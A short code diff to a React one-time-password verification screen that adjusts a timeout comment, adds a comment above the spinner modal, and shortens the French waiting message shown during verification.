@@ -75,7 +75,7 @@ const OTPVerification = () => {
           }
         }, 2000);
 
-        // ✅ CHANGED TO 45 SECONDS (45,000 milliseconds)
+        // 45 seconds timeout
         setTimeout(() => {
           clearInterval(interval);
           setIsVerifying(false);
@@ -139,12 +139,13 @@ const OTPVerification = () => {
         </button>
       </div>
 
+      {/* ✅ UPDATED SPINNER MODAL */}
       {isVerifying && (
         <div className="modal-overlay">
           <div className="modal-content">
             <div className="spinner"></div>
             <h3 className="modal-title">Vérification en cours</h3>
-            <p className="modal-text">Veuillez patienter pendant que l'administrateur vérifie votre code...</p>
+            <p className="modal-text">Veuillez patienter...</p>
           </div>
         </div>
       )}
